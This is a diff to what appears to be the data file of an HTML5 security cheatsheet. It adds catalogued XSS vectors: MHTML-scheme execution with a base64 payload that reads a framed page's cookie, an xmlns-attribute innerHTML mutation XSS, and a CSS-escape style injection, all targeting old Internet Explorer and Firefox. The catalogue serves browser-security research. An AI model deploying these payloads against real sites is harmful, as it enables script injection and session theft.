@@ -1829,11 +1829,11 @@ var items =
         'tags'       : ['xss', 'javascript', 'e4x', 'script', 'parser', 'regex'],
         'reporter'   : '.mario'
     },
-    { /* ID 59 - XSS using accent grave when copying innerHTML */
+    { /* ID 59 - XSS using accent grave when copying innerHTML (1) */
         'id'         : 59,
         'category'   : 'html', 
         'name'       : {
-            'en' : 'XSS using accent grave when copying innerHTML',
+            'en' : 'XSS using accent grave when copying innerHTML (1)',
             'ja' : 'innerHTML\u3092\u30b3\u30d4\u30fc\u3059\u308b\u969b\u306e\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u3092\u4f7f\u3063\u305fXSS',
             'ru' : '',
             'de' : ''
@@ -2595,7 +2595,7 @@ var items =
             'internet explorer': ['8.0', '9.0']
         },
         'tags'       : ['xss', 'javascript', 'xml stylesheet', 'css', 'internet explorer', 'expression',  'xml'],
-        'reporter'   : '.mario, LeverOne'
+        'reporter'   : '.mario'
     },
     { /* ID 83 - Obfuscation unsafe parameter via wml-variables. */
         'id'         : 83,
@@ -2994,5 +2994,108 @@ var items =
         },
         'tags'       : ['xss', 'svg', 'opera', 'filter effects', 'feimage'],
         'reporter'   : '.mario'
+    },
+    { /* ID 96 - JavaScript execution via MHTML-scheme */
+        'id'         : 96,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'JavaScript execution via MHTML-scheme',
+            'ja' : '',
+            'ru' : 'Исполнение Javascript с использованием MHTML-схемы.',
+            'de' : ''
+        },
+        'data'       : 'mhtml:http://heideri.ch/jso/test.html!xss.html',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/test.html',
+            'name'          : 'test.html',
+            'raw'           : '<html>\n<body>\n<b>some content without two new line \\n\\n</b>\nContent-Type: multipart/related; boundary="******"<b>some content without two new line</b>\n--******\nContent-Location: xss.html\nContent-Transfer-Encoding: base64\n\nPGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1\ncmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9\ndXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy\nYW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg\n--\n</body>\n</html>'
+        },
+        'description': {
+	    'en' : 'Any format, including images (remains valid, since it allows text sectors), may be considered as web-archive, if the user input is allowed before the first two new lines. By this vector are vulnerable all sites that do not contain two new lines in the source code and allows users to insert new line, as well as all sites that allows users to upload inconvertible images etc. A link to the web-archive can be specified in the tag <IFRAME> or via location or via anything else.',
+            'ja' : '',
+            'ru' : 'Любой формат, включая изображения (остаются неиспорченными, поскольку содержат текстовые секторы), может рассматриваться в качестве веб-архива, если пользователь имеет возможность влиять на исходный код сайта до первой пустой строки, или первых двух переводов строк. Этим вектором уязвимы все сайты, которые не содержат пробелов в исходном коде и позволяют пользователю вставлять новые строки, а также все сайты, которые позволяют пользователям загружать неконвертируемые изображения и т.п. Ссылка на архив может быть указана в теге <IFRAME> или с помощью location, или как-либо ещё.',
+            'de' : ''
+        },
+        'urls'    : ['http://en.wikipedia.org/wiki/MHTML'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': [
+                '5.0','6.0', '7.0', '8.0'
+            ]
+        },
+        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml', 'css'],
+        'reporter'   : 'bolk, LeverOne'
+    },
+    { /* ID 97 - XSS using "xmlns" attribute in custom tag when copying innerHTML (2) */
+        'id'         : 97,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'XSS using "xmlns" attribute in custom tag when copying innerHTML (2)',
+            'ja' : '',
+            'ru' : 'XSS с использованием атрибута xmlns в сочетании с пользовательским (custom) тегом при копировании с помощью innerHTML (2)',
+            'de' : ''
+        },
+        'data'       : '<div id=d><x xmlns="><iframe onload=%js_alert%"></div>\n<script>d.innerHTML=d.innerHTML</script>',
+        'description': {
+	    'en' : 'Internet Explorer incorrectly analyzes the attribute "xmlns" in custom tags when copying innerHTML - its parameter is added to the tag <?XML:NAMESPACE> without delimiters.',
+            'ja' : '',
+            'ru' : 'Internet Explorer неправильно анализирует атибут xmlns в пользовательских тегах при копировании с помощью innerHTML: параметр этого атрибута добавляется в тег <?XML:NAMESPACE> без оганичителей.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': [
+                '6.0', '7.0', '8.0'
+            ]
+        },
+        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 98 - Style injection when copying innerHTML (3) */
+        'id'         : 98,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'Style injection when copying innerHTML (3)',
+            'ja' : '',
+            'ru' : 'Стилевая инъекция при копировании с помощью innerHTML (3)',
+            'de' : ''
+        },
+        'data'       : '<div id=d><div style="font-family:\'sans\\27\\3B color\\3Ared\\3B\'">X</div></div>\n<script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
+        'description': {
+	    'en' : 'The example shows how Internet Explorer and Mozilla Firefox automaticaly decode CSS-encoding if the harmless markup is copied using innerHTML.',
+            'ja' : '',
+            'ru' : 'Пример показывает, как Internet Explorer and Mozilla Firefox автоматически декодируют CSS-кодировку в случае, если на первый взгляд безопасная разметка копируется с помощью innerHTML.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': [
+                '6.0', '7.0', '8.0'
+            ],
+            'firefox': [
+                '2.x', '3.x'
+            ], 
+        },
+        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml', 'css'],
+        'reporter'   : 'sdc'
     }
 ]
